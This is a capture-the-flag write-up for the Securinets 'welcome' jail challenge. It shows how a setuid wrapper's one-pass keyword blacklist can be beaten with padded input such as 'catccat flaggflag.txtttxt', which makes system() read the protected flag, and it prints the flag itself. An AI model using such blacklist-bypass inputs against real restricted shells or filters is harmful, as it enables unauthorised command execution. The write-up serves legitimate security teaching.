# **welcome**

#### tag : pwnable, jail

-----------------------------------------------

#### Description

>Unlike other CTFs we build a custom welcome for u \o/
>
>Your goal is to execute welcome binary ssh welcome@51.254.114.246
>
>password : bc09c4a0a957b3c6d8adbb47ab0419f7
>
>Author : Anis_Boss

-----------------------------------------------

#### Solution

After entered into ssh, there are two executable files, two source code and flag. `welcome.c` is not readable and `welcome` is not executable by permission. I can access only `wrapper` and read `wrapper.c`. Here is [wrapper.c](./wrapper.c).

```
$ ls -l
total 40
-r-------- 1 welcome-cracked welcome-cracked    76 Mar 23 20:23 flag.txt
-r-------- 1 welcome-cracked welcome          8712 Mar 23 19:09 welcome
-rw-r----- 1 root            root              175 Mar 23 12:27 welcome.c
-r-s--x--- 1 welcome-cracked welcome         13088 Mar 23 20:13 wrapper
-rw-r--r-- 1 root            root             1741 Mar 23 20:13 wrapper.c

$ whoami
welcome
```

`wrapper` is simple program that filtered by blacklist keyword input will be executed by `system()`. It little bit like rbash but it is very poor filtering. Because it just one keyword in blacklist is filtered only one time. So, if I put `ban-keyword ban-keyword`, then `ban-keyword` will be result of filtered string!

There is routine for one time `search()` which is filtering function.

```c
for (int i=0;i<sizeof(blacklist)/sizeof(blacklist[0]);i++)
{
    index = search(str, blacklist[i]);

    if (index !=  - 1)
    {
        delete_word(str, blacklist[i], index);
    }

}
```

But in `delete_word()`, byte of `last filtered-word-byte + 1` is deleted together. So I put dummy byte to each filtered keyword to make complete query. `cat[X]cat flag[X]flag.txt[X]txt` will be `cat flag.txt` in this case.

```
$ ./wrapper
Welcome to Securinets Quals CTF o/
Enter string:
catccat flaggflag.txtttxt   
securinets{who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?}
```
**securinets{who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?}**
